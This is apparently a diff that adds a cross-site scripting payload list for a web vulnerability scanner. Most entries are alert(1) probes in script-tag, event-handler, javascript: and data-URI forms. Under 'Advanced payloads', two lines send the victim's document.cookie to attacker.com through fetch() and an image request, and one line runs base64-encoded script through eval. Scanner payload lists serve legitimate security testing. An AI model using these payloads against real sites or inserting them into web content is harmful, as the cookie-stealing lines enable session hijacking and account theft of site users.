@@ -1,0 +1,28 @@
+# XSS Payloads for Web Vulnerability Scanner
+# Basic payloads
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+
+# Event handler payloads
+<body onload=alert(1)>
+<iframe onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<div onmouseover="alert(1)">hover me</div>
+
+# JavaScript protocol payloads
+javascript:alert(1)
+javascript:alert(document.domain)
+javascript:alert(document.cookie)
+
+# Data URI payloads
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# Advanced payloads
+<script>fetch(`https://attacker.com?cookie=${document.cookie}`)</script>
+<script>var i=new Image();i.src="https://attacker.com/?"+document.cookie;</script>
+<svg/onload=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>
